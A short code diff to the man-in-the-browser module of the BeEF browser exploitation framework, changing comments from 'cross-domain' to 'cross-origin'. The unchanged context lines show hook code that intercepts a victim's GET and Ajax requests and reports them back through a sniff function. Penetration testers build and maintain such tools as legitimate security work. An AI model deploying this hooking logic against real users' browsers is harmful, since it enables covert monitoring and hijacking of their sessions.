@@ -33,11 +33,11 @@ beef.mitb = {
 
                         //GET request
                         if (method == "GET") {
-                            //GET request -> cross-domain
+                            //GET request -> cross-origin
                             if (url.indexOf(document.location.hostname) == -1 || (portR != null && requestPort != document.location.port )) {
                                 beef.mitb.sniff("GET [Ajax CrossDomain Request]: " + url);
                                 window.open(url);
-                            }else { //GET request -> same-domain
+                            }else { //GET request -> same-origin
                                 beef.mitb.sniff("GET [Ajax Request]: " + url);
                                 if (beef.mitb.fetch(url, document.getElementsByTagName("html")[0])) {
                                     var title = "";
@@ -198,7 +198,7 @@ beef.mitb = {
             beef.mitb.sniff("GET: " + url);
 
         } catch (x) {
-            // the link is cross-domain, so load the resource in a different tab
+            // the link is cross-origin, so load the resource in a different tab
             window.open(url);
             beef.mitb.sniff("GET [New Window]: " + url);
         }
